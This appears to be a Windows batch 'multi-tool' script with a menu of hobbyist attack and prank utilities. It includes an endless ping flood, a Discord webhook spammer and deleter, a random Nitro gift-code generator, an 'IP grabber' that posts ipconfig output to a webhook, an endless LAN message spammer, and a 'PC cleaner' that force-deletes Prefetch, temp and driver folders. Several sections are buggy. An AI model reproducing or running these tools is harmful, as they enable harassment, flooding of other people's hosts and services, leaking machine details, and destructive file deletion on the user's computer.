@echo off
title main
cls
chcp 65001 
:login
@echo off 
title Login 
color 3 
cls 
echo.
echo              ███╗   ███╗ ██████╗  ██████╗ ███╗   ███╗
echo              ████╗ ████║██╔═══██╗██╔═══██╗████╗ ████║
echo              ██╔████╔██║██║   ██║██║   ██║██╔████╔██║
echo              ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╔╝██║
echo              ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚═╝ ██║
echo              ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
echo.
echo.
echo =================================================
set /p user=Enter user :
set /p pass=Enter pass :
echo =================================================
if "%user%"=="1" if "%pass%"=="1" goto hub
goto login 
goto hub
:hub
chcp 65001 >nul
color 3
cls
echo.
echo              ███╗   ███╗ ██████╗  ██████╗ ███╗   ███╗
echo              ████╗ ████║██╔═══██╗██╔═══██╗████╗ ████║
echo              ██╔████╔██║██║   ██║██║   ██║██╔████╔██║
echo              ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╔╝██║
echo              ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚═╝ ██║
echo              ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
echo.
echo.
echo =================================================
echo 1   IP Pinger
echo 2   IP Location
echo 3   Webhook Spam
echo 4   Webhook Kill
echo 5   Nitro Gen
echo 6   Url Shorten
echo 7   IP Grabber  (DOWN)
echo 8   PC Cleaner 
echo 9   Netdiscover
echo 10  Shutdown 
echo 11  Message Spammer 
echo =================================================
set /p choice=Enter choice: 

if "%choice%"=="1" goto Pinger
if "%choice%"=="2" goto Location
if "%choice%"=="3" goto Webhook
if "%choice%"=="4" goto Killer
if "%choice%"=="5" goto Nitro
if "%choice%"=="6" goto URL
if "%choice%"=="7" goto Grabb
if "%choice%"=="8" goto Clean
if "%choice%"=="9" goto Net
if "%choice%"=="10" goto shutdown
if "%choice%"=="11" goto message 
goto hub

:Location
@echo off
title IP Location
color 3
cls
echo.
echo              ███╗   ███╗ ██████╗  ██████╗ ███╗   ███╗
echo              ████╗ ████║██╔═══██╗██╔═══██╗████╗ ████║
echo              ██╔████╔██║██║   ██║██║   ██║██╔████╔██║
echo              ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╔╝██║
echo              ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚═╝ ██║
echo              ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
echo.
echo.
echo.
set /p IP=Enter IP: 
curl "https://ipinfo.io/%IP%/json" -o geolocation.json
echo ==================================
echo IP Geolocation for %IP%:
type geolocation.json
del geolocation.json
pause
goto hub

:Pinger
@echo off
title IP Pinger
color 3
cls
echo.
echo              ███╗   ███╗ ██████╗  ██████╗ ███╗   ███╗
echo              ████╗ ████║██╔═══██╗██╔═══██╗████╗ ████║
echo              ██╔████╔██║██║   ██║██║   ██║██╔████╔██║
echo              ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╔╝██║
echo              ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚═╝ ██║
echo              ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
echo.
echo.
echo.
set /p Ping=Enter IP to ping           : 
set /p Byte=Enter Bytes to ping        :
:again
ping %Ping% -l %Byte%
goto again

:Webhook
title Webhook Spam
cls
color 3
echo.
echo              ███╗   ███╗ ██████╗  ██████╗ ███╗   ███╗
echo              ████╗ ████║██╔═══██╗██╔═══██╗████╗ ████║
echo              ██╔████╔██║██║   ██║██║   ██║██╔████╔██║
echo              ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╔╝██║
echo              ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚═╝ ██║
echo              ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
echo.
echo.
echo.
echo.
cls
echo ┌────────────────────────────────┐
echo │     Discord webhook spammer    │
echo ├────────────────────────────────┤
set /p "webhook=│ Enter Discord webhook URL for Message Sender: "
set /p "message=│ Enter the message to send: "
set /p "num_times=│ Enter the number of times to send the message: "

for /l %%n in (1,1,%num_times%) do (
    :: Send message to Discord webhook
    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%message%\"}" %webhook%
)
echo Messages sent successfully.
pause
goto hub
:Nitro 
@echo off 
cls
color 3
echo.
echo              ███╗   ███╗ ██████╗  ██████╗ ███╗   ███╗
echo              ████╗ ████║██╔═══██╗██╔═══██╗████╗ ████║
echo              ██╔████╔██║██║   ██║██║   ██║██╔████╔██║
echo              ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╔╝██║
echo              ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚═╝ ██║
echo              ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
echo.
echo.
echo.
echo.

setlocal enabledelayedexpansion

set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set "num_codes=10"
set "code_length=16"

for /l %%i in (1,1,%num_codes%) do (
    set "code="
    for /l %%j in (1,1,%code_length%) do (
        set /a "rand=!random! %% 36"
        for %%k in (!rand!) do (
            set "code=!code!!characters:~%%k,1!"
        )
    )
    echo https://discord.gift/!code!
)

endlocal
pause
:Killer
@echo off
cls 
title webhook killer 
color 3
echo.
echo              ███╗   ███╗ ██████╗  ██████╗ ███╗   ███╗
echo              ████╗ ████║██╔═══██╗██╔═══██╗████╗ ████║
echo              ██╔████╔██║██║   ██║██║   ██║██╔████╔██║
echo              ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╔╝██║
echo              ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚═╝ ██║
echo              ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
echo.
echo.
echo. 
set /p "webhook=Enter Webhook URL to delete: "
curl -X DELETE %webhook%
echo Webhook deleted successfully.
pause
:URL
@echo off 
color 3
cls 
title URL Shorten
echo.
echo              ███╗   ███╗ ██████╗  ██████╗ ███╗   ███╗
echo              ████╗ ████║██╔═══██╗██╔═══██╗████╗ ████║
echo              ██╔████╔██║██║   ██║██║   ██║██╔████╔██║
echo              ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╔╝██║
echo              ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚═╝ ██║
echo              ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
echo.
echo.
echo. 
set /p url=Enter the URL to shorten: 
echo Shortened URL: http://tinyurl.com/api-create.php?url=!url!
pause
goto hub
:Grabb
@echo off 
title IP Grabber 
cls
echo ██████████████████████ Grab IP Info and Send to Webhook ██████████████████████
echo.
set /p webhook=Enter your webhook URL: 


if "%webhook%"=="" (
    echo Please enter a valid Discord webhook URL.
    pause
    goto menu
)

ipconfig >ip.txt

curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"IP Configuration:\n\`\`\`$(type ip.txt)\`\`\`\"}" %webhook%

del ip.txt
cls
echo.
pause
goto hub
:Clean 
@echo off 
color 3
cls
title PC Cleaner 
echo.
echo              ███╗   ███╗ ██████╗  ██████╗ ███╗   ███╗
echo              ████╗ ████║██╔═══██╗██╔═══██╗████╗ ████║
echo              ██╔████╔██║██║   ██║██║   ██║██╔████╔██║
echo              ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╔╝██║
echo              ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚═╝ ██║
echo              ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
echo.
echo.
echo.
rem Delete Temporary Files
del /s /f /q %WinDir%\Temp\*.*
del /s /f /q %WinDir%\Prefetch\*.*
del /s /f /q %Temp%\*.*
del /s /f /q %AppData%\Temp\*.*
del /s /f /q %HomePath%\AppData\LocalLow\Temp\*.*

rem Delete Used Drivers Files (Not needed because already installed)
del /s /f /q %SYSTEMDRIVE%\AMD\*.*
del /s /f /q %SYSTEMDRIVE%\NVIDIA\*.*
del /s /f /q %SYSTEMDRIVE%\INTEL\*.*

rem Delete Temporary Folders
rd /s /q %WinDir%\Temp
rd /s /q %WinDir%\Prefetch
rd /s /q %Temp%
rd /s /q %AppData%\Temp
rd /s /q %HomePath%\AppData\LocalLow\Temp

rem Delete Used Drivers Folders (Not needed because already installed)
rd /s /q %SYSTEMDRIVE%\AMD
rd /s /q %SYSTEMDRIVE%\NVIDIA
rd /s /q %SYSTEMDRIVE%\INTEL

rem Recreate Empty Temporary Folders
md %WinDir%\Temp
md %WinDir%\Prefetch
md %Temp%
md %AppData%\Temp
md %HomePath%\AppData\LocalLow\Temp

echo.
echo Windows Clean Up Done!, You can exit by pressing any key.
echo.
pause > NUL
goto hub 
:Net
@echo off 
title Netdiscover
color 3
cls 
echo.
echo              ███╗   ███╗ ██████╗  ██████╗ ███╗   ███╗
echo              ████╗ ████║██╔═══██╗██╔═══██╗████╗ ████║
echo              ██╔████╔██║██║   ██║██║   ██║██╔████╔██║
echo              ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╔╝██║
echo              ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚═╝ ██║
echo              ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
echo.
echo.
echo.
arp/a 
pause
goto hub 
:shutdown
@echo off 
title shutdown 
cls 
color 3 
echo.
echo              ███╗   ███╗ ██████╗  ██████╗ ███╗   ███╗
echo              ████╗ ████║██╔═══██╗██╔═══██╗████╗ ████║
echo              ██╔████╔██║██║   ██║██║   ██║██╔████╔██║
echo              ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╔╝██║
echo              ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚═╝ ██║
echo              ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
echo.
echo.
echo.
shutdown -i
goto hub 
:message 
@echo off 
title Message Spammer 
echo.
cls
echo.
echo              ███╗   ███╗ ██████╗  ██████╗ ███╗   ███╗
echo              ████╗ ████║██╔═══██╗██╔═══██╗████╗ ████║
echo              ██╔████╔██║██║   ██║██║   ██║██╔████╔██║
echo              ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╔╝██║
echo              ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚═╝ ██║
echo              ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
echo.
echo.
echo.
echo Are you sure you wanna do this ? 
echo It will fully spamm all computers in your wifi 
echo NOTE ONLY WORKS WITH WINDOWS PRO EDITIONS
echo.  PRESS ENTER IF YOU WANT TO CONTINUE 
pause
cls
echo.
echo              ███╗   ███╗ ██████╗  ██████╗ ███╗   ███╗
echo              ████╗ ████║██╔═══██╗██╔═══██╗████╗ ████║
echo              ██╔████╔██║██║   ██║██║   ██║██╔████╔██║
echo              ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╔╝██║
echo              ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚═╝ ██║
echo              ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
echo.
echo.
echo.
set /p msg=Enter message to spam : 
:fuck
msg * %msg%
goto fuck


